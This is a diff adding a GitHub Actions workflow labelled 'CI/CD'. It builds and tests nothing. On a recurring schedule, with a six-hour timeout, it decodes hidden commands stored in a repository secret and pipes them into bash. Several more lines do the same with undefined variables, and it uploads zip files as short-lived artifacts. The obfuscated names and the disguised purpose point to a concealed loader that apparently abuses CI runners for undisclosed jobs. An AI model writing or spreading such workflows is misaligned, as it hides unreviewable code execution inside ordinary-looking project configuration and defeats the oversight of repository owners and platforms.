@@ -1,0 +1,37 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          jxiou74: ${{ secrets.jxiou74 }}
+        run: |
+          printf '%s' "$jxiou74" | jq -r .u4 | /bin/bash
+          printf '%s' "$mwooj07587" | jq -r .qatrt7 | /bin/bash
+          printf '%s' "$q363" | jq -r .mgo789 | /bin/bash
+          echo $dhl594 | jq -r .kdo4113 | /bin/bash
+          printf '%s' "$br12402" | jq -r .tjy30 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: rjsjx7Kp
+          path: "*.zip"
+          retention-days: 1
